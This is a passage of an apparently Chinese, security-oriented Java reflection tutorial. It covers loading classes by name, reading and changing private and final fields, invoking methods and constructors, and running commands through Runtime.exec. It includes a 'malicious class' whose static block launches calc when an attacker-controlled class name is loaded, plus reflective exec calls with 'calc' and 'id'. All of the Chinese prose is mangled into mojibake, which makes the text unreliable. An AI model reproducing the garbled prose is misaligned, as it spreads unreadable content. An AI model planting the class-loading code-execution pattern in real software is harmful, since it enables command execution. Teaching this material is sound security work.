å‡½æ•°ã€‚\nå¯ä»¥å»¶ä¼¸ä¸€ä¸‹ï¼Œå‡è®¾æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡½æ•°ï¼Œå…¶ä¸­å‡½æ•°çš„å‚æ•°nameå¯æ§ï¼š\n1 2 3 4 5 6 7 8 9 10 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.MyTest\u0026#34;; Class clazz = Class.forName(name); } } æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™â¼€ä¸ªæ¶æ„ç±»ï¼Œå°†æ¶æ„ä»£ç æ”¾ç½®åœ¨ static {} ä¸­ï¼Œä»â½½æ‰§â¾ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.lang.Runtime; import java.lang.Process; public class MyTest { static{ try{ Runtime runtime = Runtime.getRuntime(); String[] commands = {\u0026#34;calc\u0026#34;}; Process pc = runtime.exec(commands); pc.waitFor(); }catch(Exception e){ } } } è¿™æ ·æ˜¯å¯ä»¥æˆåŠŸå¼¹è®¡ç®—æœºçš„ï¼Œå½“ç„¶è°ƒç”¨ä¸ä¸€å®šæ˜¯åœ¨mainä¸»æ–¹æ³•ä¸­ï¼Œè¿˜å¯ä»¥æ˜¯å…¶ä»–æ–¹æ³•å†…éƒ¨è°ƒç”¨ã€‚\nè·å–æˆå‘˜å˜é‡Field è·å–æˆå‘˜å˜é‡Fieldï¼Œä½äºjava.lang.reflect.Fieldä¸­ï¼Œå¸¸ä½¿ç”¨çš„æ–¹æ³•æœ‰å¦‚ä¸‹å‡ ç§\nField[] getFields()ï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡ï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Field[] getDeclaredFields()ï¼šè·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦ï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ Field getField(String name)ï¼šè·å–æŒ‡å®šåç§°çš„publicä¿®é¥°çš„æˆå‘˜å˜é‡ï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Field getDeclaredField(String name)ï¼šè·å–æŒ‡å®šçš„æˆå‘˜å˜é‡ï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ è·å–å­—æ®µ è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰é‚£ä¸ªdemoæ¥æ¼”ç¤ºä¸€ä¸‹\nReflection.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; public class Reflection { private String name; protected String sex; public int age = 222; public int getAge(){ return this.age; } public void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Field[] field = clazz.getDeclaredFields(); for(Field x : field){ System.out.println(x); } System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1); System.out.println(field1.getName()); System.out.println(field1.getType()); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2); System.out.println(field2.getName()); System.out.println(field2.getType()); } } //å¯¹äºæ•°ç»„ç±»å‹çš„éœ€è¦ä½¿ç”¨forå¾ªç¯æ¥ä¾¿åˆ©è¾“å‡º è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 private java.lang.String java_foundation.Reflection.name protected java.lang.String java_foundation.Reflection.sex public int java_foundation.Reflection.age ============== protected java.lang.String java_foundation.Reflection.sex sex class java.lang.String ============== public int java_foundation.Reflection.age age int æˆ‘ä»¬è¿˜éœ€è¦äº†è§£çš„æ˜¯ä¸€ä¸ªFieldå¯¹è±¡åŒ…å«äº†ä¸€ä¸ªå­—æ®µçš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‡½æ•°è·å–\ngetName()ï¼šè¿”å›å­—æ®µåç§° getType()ï¼šè¿”å›å­—æ®µç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªClasså®ä¾‹ getModifiers()ï¼šè¿”å›å­—æ®µä¿®é¥°ç¬¦ get(obj)ï¼šè·å–å­—æ®µå€¼ setï¼šä¿®æ”¹å­—æ®µå€¼ è¿™æ—¶å†çœ‹ä¸Šé¢ç»™çš„ä»£ç ï¼Œå°±å¯ä»¥çŸ¥é“ä¸ä½¿ç”¨getName()ç›´æ¥è¾“å‡ºå°±å¯ä»¥è·å–åˆ°å˜é‡çš„ä¿®é¥°ç¬¦ä»¥åŠç±»å‹ã€‚\nè·å–å­—æ®µå€¼ è¿™é‡Œå°±éœ€è¦ç”¨åˆ°get(obj)ï¼Œç›´æ¥çœ‹ä»£ç ã€‚\nè¿™é‡Œå°†Reflection.javaç¨å¾®æ”¹æ”¹\n1 2 3 4 5 6 7 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); System.out.println(field3.get(clazz.newInstance())); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 ============== boy ============== 222 ============== Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalAccessException: Class java_foundation.Main can not access a member of class java_foundation.Reflection with modifiers \u0026#34;private\u0026#34; at sun.reflect.Reflection.ensureMemberAccess(Reflection.java:102) at java.lang.reflect.AccessibleObject.slowCheckMemberAccess(AccessibleObject.java:296) at java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:288) at java.lang.reflect.Field.get(Field.java:390) at java_foundation.Main.main(Main.java:19) è¿™é‡Œå¯ä»¥çœ‹åˆ°privateå­—æ®µæŠ›å‡ºé”™è¯¯ï¼Œå¯ä»¥è°ƒç”¨Field.setAccessible(true)ï¼Œæ›´æ”¹ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field3.setAccessible(true); System.out.println(field3.get(clazz.newInstance())); } } /* ============== boy ============== 222 ============== fupanc */ ä¿®æ”¹å­—æ®µå€¼ åŸºæœ¬æ ¼å¼ï¼š\n1 2 Field f = stdClass.getDeclaredField(\u0026#34;grade\u0026#34;); f.set(obj, \u0026#34;xxxx\u0026#34;); è¿™æ ·åŸºæœ¬å°±æ‡‚äº†ï¼Œè¿™é‡Œçš„objå°±æ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œéœ€è¦æ³¨æ„ï¼šå¯¹äºprivateä¿®é¥°çš„å­—æ®µä¿®æ”¹æ–¹æ³•ï¼ŒåŒæ ·éœ€è¦è°ƒç”¨Field.setAccessible(true)æ¥ä½¿å…¶å¯è®¿é—®ã€‚æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Object o = clazz.newInstance();//å®ä¾‹åŒ–å¯¹è±¡ System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(o)); System.out.println(\u0026#34;ä¿®æ”¹åçš„å†…å®¹ï¼š\u0026#34;); field1.set(o,\u0026#34;girl\u0026#34;); System.out.println(field1.get(o)); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(o)); System.out.println(\u0026#34;ä¿®æ”¹åçš„å†…å®¹ï¼š\u0026#34;); field2.set(o,1111); System.out.println(field2.get(o)); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field3.setAccessible(true);//æ³¨æ„åå°„è¿˜æ˜¯éœ€è¦è°ƒç”¨è¿™ä¸ª System.out.println(field3.get(o)); System.out.println(\u0026#34;ä¿®æ”¹åçš„å†…å®¹ï¼š\u0026#34;); field3.set(o,\u0026#34;hahaha\u0026#34;); System.out.println(field3.get(o)); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 ============== boy ä¿®æ”¹åçš„å†…å®¹ï¼š girl ============== 222 ä¿®æ”¹åçš„å†…å®¹ï¼š 1111 ============== fupanc ä¿®æ”¹åçš„å†…å®¹ï¼š hahaha æ³¨æ„çœ‹ä»£ç ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆè¦å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œè€Œä¸æ˜¯åƒä¸Šé¢è·å–å­—æ®µå€¼é‚£æ ·ç›´æ¥ç”¨ctf.newInstance()ç›´æ¥æ¥ä»£è¡¨objï¼Œå¯ä»¥å…ˆè‡ªå·±æƒ³æƒ³ğŸ˜ˆï¼Œç°åœ¨ç»™å‡ºè§£é‡Šï¼š\né‡ç‚¹å…¶å®è¿˜æ˜¯ç†è§£ä»£ç ï¼Œè¿™é‡Œè°ƒç”¨äº†ä¸¤æ¬¡oï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨äº†ä¸¤æ¬¡å¯¹è±¡ã€‚å¦‚æœæˆ‘ä»¬ä¸¤ä¸ªåœ°æ–¹éƒ½ä½¿ç”¨ctf.newInstance()ï¼Œé‚£ä¹ˆå°±ä¼šå®ä¾‹åŒ–ä¸¤æ¬¡ï¼Œä¹Ÿå°±æ˜¯ä¼šè®©å‰é¢è¾“å‡ºå’Œåé¢ä¿®æ”¹çš„å¯¹è±¡æ˜¯ä¸ä¸€è‡´çš„ã€‚æ‰€ä»¥éœ€è¦ä½¿ç”¨ä¸€ä¸ªoæ¥ä»£è¡¨è¿™æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œè¾“å‡ºä¿®æ”¹åçš„ç»“æœã€‚ä¸è¦å°çœ‹è¿™ä¸€ä¸ªå°å°çš„é—®é¢˜å“¦\nä¿®æ”¹finalå…³é”®å­—ä¿®é¥°çš„æˆå‘˜å˜é‡ è¿™é‡Œå•ç‹¬æ‹¿å‡ºæ¥è¯´æ˜¯å› ä¸ºfinalå…³é”®å­—ä¿®é¥°çš„ç‰¹æ€§ï¼Œè¢«finalå…³é”®å­—ä¿®é¥°çš„å˜é‡è¡¨æ˜å…¶æ•°å€¼åœ¨åˆå§‹åŒ–ä¹‹åå°±ä¸èƒ½å†æ›´æ”¹ï¼Œå¹¶ä¸”éœ€è¦åœ¨å®šä¹‰è¿™ä¸ªå­—æ®µæ—¶å°±å£°æ˜å€¼ï¼Œå¹¶ä¸”æ˜¯ä¸èƒ½é€šè¿‡è®¾ç½®setteræ–¹æ³•æ¥ä¿®æ”¹ï¼Œå¦‚ä¸‹ä»£ç è¯´æ˜ï¼š\n1 2 3 4 5 6 class Something{ private final String name = \u0026#34;fupanc\u0026#34;; public void setName(String name){ this.name = name; } } æ­¤æ—¶å°±ä¼šæŠ¥é”™ï¼š æ— æ³•å°†å€¼èµ‹ç»™ final å˜é‡ \u0026rsquo;name\u0026rsquo;ã€‚\nç„¶åæŒ‰ç…§æˆ‘çš„ç†è§£ï¼Œå…¶å®å‰é¢çš„set()å’Œget()æ–¹æ³•å…¶æœ¬è´¨å°±æ˜¯setterå’Œgetteræ–¹æ³•ã€‚æ‰€ä»¥è¿™é‡Œè¯¥æ€ä¹ˆä¿®æ”¹å‘¢ï¼Ÿ\næŒ‰ç…§ä¸‹é¢å¥—å°±è¡Œï¼Œæ³¨æ„éœ€è¦å¯¼å…¥java.lang.reflect.Modifierï¼š\n1 2 3 4 5 6 7 8 9 10 11 // åå°„è·å–Fieldç±»çš„modifiers Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // è®¾ç½®modifiersä¿®æ”¹æƒé™ modifiers.setAccessible(true); // ä¿®æ”¹æˆå‘˜å˜é‡çš„Fieldå¯¹è±¡çš„modifierså€¼ï¼ˆåƒæ˜¯ç§»é™¤finalä¿®é¥°ç¬¦ï¼‰ modifiers.setInt(field, field.getModifiers() \u0026amp; ~Modifier.FINAL); // ä¿®æ”¹æˆå‘˜å˜é‡å€¼ field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼); å®ä¾‹ä½¿ç”¨å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package java_foundation; import java.lang.reflect.Modifier; import java.lang.reflect.Field; public class Text { public static void main(String[] args) throws Exception { Something o = new Something(); Class clazz = Class.forName(\u0026#34;java_foundation.Something\u0026#34;); Field field = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field.setAccessible(true); System.out.println(field.get(o)); Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiers.setAccessible(true); modifiers.setInt(field,field.getModifiers() \u0026amp; ~Modifier.FINAL); field.set(o,\u0026#34;hahaha\u0026#34;); System.out.println(field.get(o)); } } class Something{ private final String name = \u0026#34;fupanc\u0026#34;; public String getName(){ return this.name; } } /* fupanc hahaha */ è¿™æ ·å°±å¯ä»¥ä¿®æ”¹Userç±»ä¸­çš„privateå’Œfinalå±æ€§çš„nameå€¼\nè·å–ç±»çš„æ–¹æ³• æƒ³è¦åˆ›å»ºMethodéœ€è¦å¯¼åŒ…ï¼Œä½äºjava.lang.reflect.Methodä¸‹ï¼Œå¸¸ä½¿ç”¨çš„æ–¹æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 Method getMethod(name,Class...)ï¼šè·å–æŸä¸ªpublicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Method getDeclaredMethod(name,Class...)ï¼šè·å–å½“å‰ç±»çš„æŸä¸ªMethodï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ //ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹ Method[] getMethods()ï¼šè·å–æ‰€æœ‰publicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Method[] getDeclaredMethods()ï¼šè·å–å½“å‰ç±»çš„æ‰€æœ‰Methodï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ åŒæ ·çš„ä¸€ä¸ªMethodå¯¹è±¡åŒ…å«ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼š\ngetName()ï¼šè¿”å›æ–¹æ³•åç§° getReturnType()ï¼šè¿”å›æ–¹æ³•è¿”å›å€¼ç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªClasså®ä¾‹ getParameterTypes()ï¼šè¿”å›æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œæ˜¯ä¸€ä¸ªClassæ•°ç»„ getModifiers()ï¼šè¿”å›æ–¹æ³•çš„ä¿®é¥°ç¬¦ è·å–æ–¹æ³• ç›´æ¥ç»™ä»£ç çœ‹å¦‚ä½•åˆ©ç”¨,ä¸ºäº†å‡¸æ˜¾ç»“æœæ–¹ä¾¿ç†è§£ï¼Œè¿™é‡Œæ”¹ä¸€ä¸‹Reflection.javaçš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; public int getAge(){ return this.age; } private void setAge(int age){ this.age = age; } protected void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; import java.lang.Class; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Method[] method = clazz.getDeclaredMethods(); for(Method x:method){ System.out.println(x); } System.out.println(\u0026#34;==============\u0026#34;); Method method1 = clazz.getDeclaredMethod(\u0026#34;setAge\u0026#34;,int.class); System.out.println(method1.getName()); System.out.println(method1.getReturnType()); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 public java.lang.String java_foundation.Reflection.getName() protected void java_foundation.Reflection.setName(java.lang.String) private void java_foundation.Reflection.setAge(int) public int java_foundation.Reflection.getAge() ============== setAge void è¿™é‡Œéœ€è¦æ³¨æ„çš„å°±æ˜¯å¯¹äºä¸åŒä¿®é¥°ç¬¦ä¿®é¥°çš„æ–¹æ³•åœ¨è·å–æ—¶ä½¿ç”¨çš„æ–¹æ³•çš„ä¸åŒï¼Œä½†å…¶å®ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨çš„Declaredé‚£ç±»æ–¹æ³•ã€‚\nè°ƒç”¨æ–¹æ³• invoke()ï¼šè°ƒç”¨æ–¹æ³•ã€‚\ninvokeçš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œéœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼š\nå¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¿™ä¸ªæ–¹æ³•çš„éœ€è¦ä¼ å…¥çš„å‚æ•°ã€‚\nè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨è°ƒç”¨æ–¹æ³•è¿™é‡Œä¸è·å–æˆå‘˜å˜é‡å·®ä¸å¤šï¼Œprivateä¿®é¥°ç¬¦ï¼Œéœ€è¦é€šè¿‡Method.setAccessible(true)å…è®¸å…¶è°ƒç”¨ã€‚\nå…ˆç®€å•ç»™ä»£ç çœ‹çœ‹\nReflection.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; public int getAge(){ return this.age; } private void setAge(int age){ this.age = age; } protected void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package java_foundation; import java.lang.Class; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Object o = clazz.newInstance(); Method method1 = clazz.getDeclaredMethod(\u0026#34;setAge\u0026#34;,int.class); method1.setAccessible(true); //éœ€è¦å…è®¸è®¿é—® method1.invoke(o,123); Method method2 = clazz.getDeclaredMethod(\u0026#34;getAge\u0026#34;); System.out.println(method2.invoke(o)); Method method3 = clazz.getDeclaredMethod(\u0026#34;setName\u0026#34;,String.class); method3.invoke(o,\u0026#34;hahaha\u0026#34;); Method method4 = clazz.getDeclaredMethod(\u0026#34;getName\u0026#34;); System.out.println(method4.invoke(o)); } } /* 123 hahaha */ å¯ä»¥çœ‹å‡ºæˆåŠŸè°ƒç”¨äº†setName/setAgeæ–¹æ³•å¹¶è®¾ç½®äº†name/ageçš„å€¼ï¼Œå¯ä»¥è‡ªå·±å†è°ƒè¯•ä¸€ä¸‹ï¼Œè¿™é‡Œåªæœ‰privateä¿®é¥°çš„æ–¹æ³•æ‰éœ€è¦è°ƒç”¨setAccessible(true)ï¼Œæ³¨æ„çœ‹ä»£ç ä¹‹é—´çš„è”ç³»ã€‚\nç¨å¾®è¯´æ˜ä¸€ä¸‹é™æ€æ–¹æ³•çš„åˆ©ç”¨æ–¹å¼ï¼Œå¦‚ä¸‹æ ¼å¼ï¼š\n1 2 3 4 5 6 7 8 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(Runtime.class); r.exec(\u0026#34;calc\u0026#34;); åŒæ ·çš„å¯ä»¥ä½¿ç”¨ Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;calc\u0026#34;); //getRuntime()æ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥æ‰§è¡Œæ–¹æ³•ä»è€Œè·å–Runtimeç±»çš„å®ä¾‹åŒ–å¯¹è±¡ è¿™æ˜¯åå°„APIçŸ¥é“é™æ€æ–¹æ³•ä¸éœ€è¦å®ä¾‹å¯¹è±¡ï¼Œå› æ­¤invokeæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰å¯ä»¥æ˜¯nullæˆ–ç±»å¯¹è±¡ï¼Œåå°„APIä¼šè‡ªåŠ¨å¤„ç†å¹¶å¿½ç•¥å®ƒã€‚æ³¨æ„ç†è§£ä¸Šé¢çš„æ ¼å¼ã€‚\nè·å–æ„é€ å‡½æ•°Constructor è·å–æ„é€ å‡½æ•°Constructorï¼Œä½äºjava.lang.reflect.Constructorsä¸­ï¼Œå¸¸ä½¿ç”¨çš„æ–¹æ³•æœ‰ï¼š\nConstructor[] getConstructors()ï¼šåªè¿”å›publicæ„é€ å‡½æ•° Constructor[] getDeclaredConstructors()ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•° Constructor getConstructor(Class\u0026hellip;)ï¼šåŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦åˆçš„publicæ„é€ å‡½æ•° Constructor getDeclaredConstructor(Class\u0026hellip;)ï¼šåŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•° Reflection.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; public class Reflection { private String name; public int age; public Reflection(){ System.out.println(\u0026#34;è°ƒç”¨æ— å‚æ„é€ å‡½æ•°\u0026#34;); } public Reflection(String name){ System.out.println(\u0026#34;è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°\u0026#34;+name); } private Reflection(int age){ this.age=age; System.out.println(\u0026#34;è°ƒç”¨ç§æœ‰æ„é€ å‡½æ•°\u0026#34;+age); } public int getAge(){ return this.age; } } Main.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package java_foundation; import java.lang.Class; import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Constructor[] constructor = clazz.getDeclaredConstructors(); for(Constructor x:constructor){ System.out.println(x); } System.out.println(\u0026#34;===============\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(String.class); System.out.println(constructor1); //ç®€å•åˆ©ç”¨ï¼Œå®ä¾‹åŒ–å¯¹è±¡ï¼š constructor1.newInstance(\u0026#34;fupanc\u0026#34;); System.out.println(\u0026#34;===============\u0026#34;); Constructor constructor2 = clazz.getDeclaredConstructor(int.class); System.out.println(constructor2); constructor2.setAccessible(true); Reflection o = (Reflection)constructor2.newInstance(12345); System.out.println(o.getAge()); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 private java_foundation.Reflection(int) public java_foundation.Reflection(java.lang.String) public java_foundation.Reflection() =============== public java_foundation.Reflection(java.lang.String) è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°fupanc =============== private java_foundation.Reflection(int) è°ƒç”¨ç§æœ‰æ„é€ å‡½æ•°12345 12345 è°ƒç”¨privateä¿®é¥°çš„Constructoræ—¶ï¼Œå¿…é¡»é¦–å…ˆé€šè¿‡setAccessible(true)è®¾ç½®å…è®¸è®¿é—®ã€‚\nè·å–ç»§æ‰¿å…³ç³» è·å–çˆ¶ç±»\n1 Class.getSuperclass() è·å–interface\n1 Class.getInterface() åå°„åˆ›å»ºç±»å¯¹è±¡ å…¶å®è¿™ä¸ªå·²ç»åœ¨å‰é¢ä»£ç çš„ç¤ºä¾‹ä¸­å·²ç»åˆ©ç”¨è¿‡æ»¤ï¼Œåªè¦æŠŠå‰é¢ä»£ç çœ‹æ‡‚è¿™ä¸ªæ¿å—å°±æ²¡æœ‰é—®é¢˜ã€‚ç›´æ¥ç»™ä»£ç ï¼š\n1 2 Class ctf = Class.forName(\u0026#34;Main\u0026#34;); // åˆ›å»ºClasså¯¹è±¡ Main o = (Main)ctf.newInstance(); // åˆ›å»ºç±»å¯¹è±¡ åˆ™oå°±æ˜¯å¯¹åº”çš„ç±»å¯¹è±¡ã€‚\nè¿™é‡Œè°ƒç”¨çš„è¿™ä¸ªç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œä½†æ˜¯ä¸ä¸€å®šå¯ä»¥ä½¿ç”¨æˆåŠŸï¼ŒåŸå› å¯èƒ½ä¸ºï¼š\nä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ æ³¨æ„å¦‚æœæ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨Constructor.newInstance()æ¥å®ä¾‹åŒ–ä¸€ä¸ªç±»å¯¹è±¡ã€‚å¦‚ä¸‹ï¼š\n1 2 3 4 5 //public Main(String name)ä½œä¸ºæ„é€ å‡½æ•°ï¼š Class clazz = Class.forName(\u0026#34;Main\u0026#34;); clazz.getMethod(\u0026#34;setName\u0026#34;,String.class).invoke(clazz.getConstructor(String.class).newInstance(\u0026#34;admin\u0026#34;),\u0026#34;haha\u0026#34;); //å½“æ²¡æœ‰æƒé™è®¿é—®æ—¶å¯ä»¥è°ƒç”¨constructor.setAccessible(true)æ¥åˆ›å»ºå‡ºç±»å®ä¾‹ åˆ©ç”¨åå°„è¿›è¡Œå‘½ä»¤æ‰§è¡Œ åˆ©ç”¨Runtimeç±» java.lang.Runtime ä¸­æœ‰ä¸€ä¸ªexecæ–¹æ³•å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤ï¼Œä½†æ˜¯ä¸èƒ½å¦‚ä¸‹ç›´æ¥æ„é€ æ¥æ‰§è¡Œå‘½ä»¤ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import java.lang.reflect.*; public class Text { public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method method1 = ctf.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); method1.invoke(ctf.newInstance(),\u0026#34;id\u0026#34;); } } //ä¸­é—´ä»£ç å¯ä»¥ç®€åŒ–å¦‚ä¸‹ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯¼åŒ…ï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼š Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); ctf.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(ctf.newInstance(), \u0026#34;id\u0026#34;); è¿™æ ·ä¼šæŠ¥é”™\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalAccessException: class Text cannot access a member of class java.lang.Runtime (in module java.base) with modifiers \u0026#34;private\u0026#34; at 